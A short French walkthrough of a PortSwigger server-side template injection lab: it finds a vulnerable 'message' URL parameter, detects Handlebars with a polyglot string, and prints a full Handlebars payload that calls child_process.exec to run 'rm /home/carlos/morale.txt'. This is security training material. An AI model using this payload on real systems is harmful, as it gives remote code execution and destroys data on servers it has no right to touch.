[PortSwigger Lab - Server-Side Template Injection](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)

En cliquant sur un produit on trouve une entrée vulnérable :
```
/?message=Unfortunately%20this%20product%20is%20out%20of%20stock
```

Sur [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) on récupère le polyglot d'injection `${{<%[%'"}}%\.` nous permettant de détecter le template utilisé.

On peut voir dans l'erreur au sein de la réponse que c'est du Handlebars. En cherchant sur internet ([guide SSTI](https://medium.com/@bdemir/a-pentesters-guide-to-server-side-template-injection-ssti-c5e3998eae68)) on trouve un payload utilisable pour ce template qu'on va customiser selon la demande du challenge puis encoder pour la mettre dans l'url.

**Payload :**

```handlebars
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
```

**Résultat final :**
![Résultat de l'exploitation SSTI](image.png)

[Documentation PortSwigger - Server-Side Template Injection](https://portswigger.net/web-security/server-side-template-injection)